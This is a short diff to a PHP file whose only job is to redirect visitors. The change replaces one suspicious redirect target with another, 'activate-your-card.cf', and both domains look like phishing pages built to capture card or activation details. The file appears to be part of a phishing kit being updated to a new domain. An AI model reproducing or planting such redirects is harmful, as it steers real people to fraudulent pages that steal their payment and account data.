@@ -1,4 +1,4 @@
 <?php
-header("Location: https://official-site-enter-key.site/actoff/setup_in.php");
+header("Location: https://activate-your-card.cf/actoff/setup_in.php");
 die();
 ?>
